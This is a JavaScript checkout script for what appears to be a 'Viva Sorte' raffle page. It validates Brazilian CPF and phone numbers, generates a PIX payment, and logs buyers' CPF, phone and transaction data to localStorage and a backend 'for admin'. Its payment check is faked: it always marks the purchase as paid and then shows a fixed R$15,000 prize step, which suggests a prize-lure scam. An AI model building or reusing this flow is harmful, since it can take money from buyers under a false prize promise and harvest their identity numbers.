// FORMATAR CPF
function formatarCPF(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length <= 11) {
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    
    input.value = value;
    return value;
}

// FORMATAR TELEFONE
function formatarTelefone(input) {
    let value = input.value.replace(/\D/g, '');
    
    if (value.length > 11) {
        value = value.substring(0, 11);
    }
    
    if (value.length > 10) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{5})(\d)/, '$1-$2');
    } else if (value.length > 6) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{4})(\d)/, '$1-$2');
    } else if (value.length > 2) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
    } else if (value.length > 0) {
        value = value.replace(/(\d)/, '($1');
    }
    
    input.value = value;
    return value;
}

// VALIDAR CPF ALGORITMICAMENTE
function validarCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    
    if (cpf.length !== 11) return false;
    
    // Verificar se todos os dígitos são iguais
    if (/^(\d)\1+$/.test(cpf)) return false;
    
    // Validar primeiro dígito verificador
    let soma = 0;
    for (let i = 0; i < 9; i++) {
        soma += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let resto = soma % 11;
    let digitoVerificador1 = resto < 2 ? 0 : 11 - resto;
    
    if (digitoVerificador1 !== parseInt(cpf.charAt(9))) return false;
    
    // Validar segundo dígito verificador
    soma = 0;
    for (let i = 0; i < 10; i++) {
        soma += parseInt(cpf.charAt(i)) * (11 - i);
    }
    resto = soma % 11;
    let digitoVerificador2 = resto < 2 ? 0 : 11 - resto;
    
    return digitoVerificador2 === parseInt(cpf.charAt(10));
}

// VALIDAR TELEFONE
function validarTelefone(telefone) {
    const telefoneLimpo = telefone.replace(/\D/g, '');
    return telefoneLimpo.length === 10 || telefoneLimpo.length === 11;
}

// ETAPA 1: VALIDAR CPF
function validarEtapa1() {
    const cpfInput = document.getElementById('inputCPF');
    const cpfFormatado = cpfInput.value;
    const cpfNumeros = cpfFormatado.replace(/\D/g, '');
    const erroCPF = document.getElementById('erroCPF');
    const sucessoCPF = document.getElementById('sucessoCPF');
    const cpfExibido = document.getElementById('cpfExibido');
    const btnContinuar = document.getElementById('btnContinuarCPF');
    
    // Resetar mensagens
    erroCPF.style.display = 'none';
    sucessoCPF.style.display = 'none';
    cpfInput.style.borderColor = '#e0e0e0';
    
    // Validação básica
    if (cpfNumeros.length !== 11) {
        erroCPF.textContent = 'CPF deve conter 11 dígitos.';
        erroCPF.style.display = 'block';
        cpfInput.style.borderColor = '#e74c3c';
        cpfInput.focus();
        return;
    }
    
    // Validação algorítmica
    if (!validarCPF(cpfFormatado)) {
        erroCPF.textContent = 'CPF inválido. Por favor, verifique o número digitado.';
        erroCPF.style.display = 'block';
        cpfInput.style.borderColor = '#e74c3c';
        cpfInput.focus();
        return;
    }
    
    // CPF válido
    dadosUsuario.cpf = cpfNumeros;
    
    cpfInput.style.borderColor = '#28a745';
    sucessoCPF.style.display = 'block';
    cpfExibido.textContent = cpfFormatado;
    
    // Atualizar botão
    btnContinuar.innerHTML = '<i class="bi bi-check-circle-fill" style="margin-right: 8px;"></i> Continuar para Pagamento';
    btnContinuar.style.background = 'linear-gradient(to right, #28a745, #20c997)';
    
    // Avançar para próxima etapa após 1 segundo
    setTimeout(() => {
        mostrarEtapa(2);
        document.getElementById('inputTelefone').focus();
    }, 1000);
    
    // Salvar dados localmente (para admin)
    salvarDadosLocal('cpf', cpfNumeros);
}

// ETAPA 2: GERAR PIX
function gerarPIX() {
    const telefoneInput = document.getElementById('inputTelefone');
    const telefoneFormatado = telefoneInput.value;
    const telefoneNumeros = telefoneFormatado.replace(/\D/g, '');
    const erroTelefone = document.getElementById('erroTelefone');
    
    // Validar telefone
    if (!validarTelefone(telefoneFormatado)) {
        erroTelefone.textContent = 'Telefone inválido. Digite um número com DDD + 8 ou 9 dígitos.';
        erroTelefone.style.display = 'block';
        telefoneInput.style.borderColor = '#e74c3c';
        telefoneInput.focus();
        return;
    }
    
    // Telefone válido
    dadosUsuario.telefone = telefoneNumeros;
    erroTelefone.style.display = 'none';
    telefoneInput.style.borderColor = '#28a745';
    
    // Salvar telefone localmente
    salvarDadosLocal('telefone', telefoneNumeros);
    
    // Desabilitar botão e mostrar loading
    const btnGerarPIX = document.getElementById('btnGerarPIX');
    btnGerarPIX.innerHTML = '<i class="bi bi-hourglass-split"></i> Gerando PIX...';
    btnGerarPIX.disabled = true;
    
    // Chamar API para gerar PIX
    fetch('/api/create-pix.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            amount: pacoteSelecionado.valor,
            quantidade: pacoteSelecionado.quantidade,
            customerData: {
                cpf: dadosUsuario.cpf,
                telefone: dadosUsuario.telefone,
                nome: "Cliente Viva Sorte",
                email: `${dadosUsuario.cpf}@vivasorte.com`
            }
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Salvar transaction ID
            dadosUsuario.transactionId = data.transaction.transaction_id;
            salvarDadosLocal('transaction_id', data.transaction.transaction_id);
            salvarDadosLocal('valor', pacoteSelecionado.valor);
            salvarDadosLocal('quantidade', pacoteSelecionado.quantidade);
            salvarDadosLocal('data', new Date().toISOString());
            
            // Exibir QR Code
            exibirQRCode(data.transaction.qr_code, data.transaction.qr_code_image);
            
            // Mostrar área do PIX
            document.getElementById('areaPIX').style.display = 'block';
            document.getElementById('btnVerificarPagamento').style.display = 'block';
            
            // Atualizar botão
            btnGerarPIX.innerHTML = 'PIX Gerado com Sucesso!';
            btnGerarPIX.style.background = '#28a745';
        } else {
            alert('Erro ao gerar PIX: ' + data.error);
            btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
            btnGerarPIX.disabled = false;
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        alert('Erro ao conectar com o servidor. Tente novamente.');
        btnGerarPIX.innerHTML = 'Gerar PIX para pagamento';
        btnGerarPIX.disabled = false;
    });
}

// EXIBIR QR CODE
function exibirQRCode(codigoPIX, qrCodeImage) {
    const qrCodeContainer = document.getElementById('qrCodeImage');
    qrCodeContainer.innerHTML = `<img src="${qrCodeImage}" alt="QR Code PIX">`;
    
    const codigoInput = document.getElementById('codigoPIX');
    codigoInput.value = codigoPIX;
    
    qrCodeGerado = codigoPIX;
}

// COPIAR CÓDIGO PIX
function copiarCodigoPIX() {
    const codigoInput = document.getElementById('codigoPIX');
    codigoInput.select();
    codigoInput.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(codigoInput.value)
        .then(() => {
            alert('Código PIX copiado para a área de transferência!');
        })
        .catch(err => {
            console.error('Erro ao copiar: ', err);
        });
}

// VERIFICAR PAGAMENTO (simulação)
function verificarPagamento() {
    // Na prática, aqui você verificaria o status na API
    // Por enquanto, simulamos um pagamento confirmado
    
    // Atualizar status local
    salvarDadosLocal('status', 'pago');
    salvarDadosLocal('data_pagamento', new Date().toISOString());
    
    // Avançar para confirmação
    mostrarEtapa(3);
}

// AVANÇAR PARA ETAPA 4 (PRÊMIO)
function avancarParaEtapa4() {
    mostrarEtapa(4);
    
    // Registrar que viu o prêmio
    salvarDadosLocal('premio_visto', 'sim');
    salvarDadosLocal('valor_premio', '15000');
    salvarDadosLocal('data_premio', new Date().toISOString());
}

// SALVAR DADOS LOCALMENTE (para admin)
function salvarDadosLocal(chave, valor) {
    // Salvar no localStorage para o admin acessar
    const dadosExistentes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
    
    // Buscar transação existente ou criar nova
    let transacao = dadosExistentes.find(t => t.transaction_id === dadosUsuario.transactionId);
    
    if (!transacao) {
        transacao = {
            transaction_id: dadosUsuario.transactionId,
            cpf: dadosUsuario.cpf,
            telefone: dadosUsuario.telefone,
            quantidade: pacoteSelecionado.quantidade,
            valor: pacoteSelecionado.valor,
            data: new Date().toISOString(),
            status: 'pendente'
        };
        dadosExistentes.push(transacao);
    }
    
    // Atualizar campo específico
    transacao[chave] = valor;
    
    // Salvar de volta
    localStorage.setItem('vivasorte_transacoes', JSON.stringify(dadosExistentes));
    
    // Também salvar em um arquivo via API (se necessário)
    enviarParaBackend(transacao);
}

// ENVIAR PARA BACKEND (opcional)
function enviarParaBackend(dados) {
    // Implemente aqui o envio para seu backend
    fetch('/api/salvar-transacao.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dados)
    })
    .catch(error => console.error('Erro ao salvar no backend:', error));
}